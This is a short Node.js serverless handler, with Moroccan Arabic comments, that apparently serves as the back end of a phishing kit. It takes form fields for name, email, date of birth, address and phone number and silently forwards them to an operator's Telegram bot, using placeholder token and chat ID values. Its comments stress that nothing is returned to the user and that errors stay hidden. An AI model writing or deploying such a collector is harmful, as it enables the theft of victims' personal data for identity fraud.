import fetch from "node-fetch";

export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).end(); // ما يرسل حتى رسالة
  }

  const { first_name, last_name, email, dob, address, postal, city, num } = req.body;

  const BOT_TOKEN = "هنا تحط Token ديال البوت ديالك";
  const CHAT_ID = "هنا تحط Chat ID ديالك";

  const message = `
📨 بيانات جديدة:
- nome: ${first_name} ${last_name}
- adress: ${email}
- date : ${dob}
- adress: ${address}, ${city}, ${postal}
- number : ${num}
  `;

  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

  try {
    await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text: message }),
    });

    // ما كاينش response للمستخدم
    return res.status(200).end();
  } catch (err) {
    console.error(err);
    return res.status(500).end(); // ما يظهرش الخطأ للمستخدم
  }
}
